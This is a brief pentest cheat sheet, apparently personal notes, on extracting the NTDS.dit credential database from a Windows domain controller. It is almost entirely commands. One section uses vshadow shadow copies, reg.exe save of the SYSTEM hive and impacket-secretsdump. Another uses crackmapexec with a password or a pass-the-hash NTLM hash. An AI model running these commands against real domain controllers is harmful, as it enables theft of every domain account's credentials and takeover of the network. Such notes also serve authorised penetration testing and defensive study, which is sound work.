# Manual NTDS Dump
```bash
# Create shadow copy
vshadow.exe -nw -p  C:

# Create a copy of ntds
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

# Copy system reg
reg.exe save hklm\system c:\system.bak

# Bring to kali and dump
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

-----------------------

# Crackmapexec
```bash
crackmapexec smb <dc-ip> -u Administrator -p Password! --ntds
crackmapexec smb <dc-ip> -u Administrator -H 56e4633688c0fdd57c610faf9d7ab8df --ntds
```
